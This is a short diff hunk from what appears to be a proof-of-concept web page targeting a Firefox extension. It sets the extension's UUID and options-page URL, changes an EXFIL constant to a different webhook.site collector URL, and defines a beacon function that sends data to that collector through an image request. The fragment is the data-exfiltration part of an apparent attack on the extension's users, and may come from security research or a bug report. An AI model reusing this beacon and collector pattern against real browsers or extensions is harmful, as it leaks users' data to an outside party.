@@ -11,7 +11,7 @@
 <script>
 const EXT_UUID = '09a6c422-a354-447d-b4ea-185cb10be869';
 const OPTIONS  = `moz-extension://${EXT_UUID}/options.html`;
-const EXFIL    = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
+const EXFIL    = 'https://webhook.site/056e7430-69a4-41c7-94be-0c62d64375b2';
 const DOC      = 'https://doc.rust-lang.org/';
 const beacon = (s) => { try { new Image().src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); } catch(e){} };
 
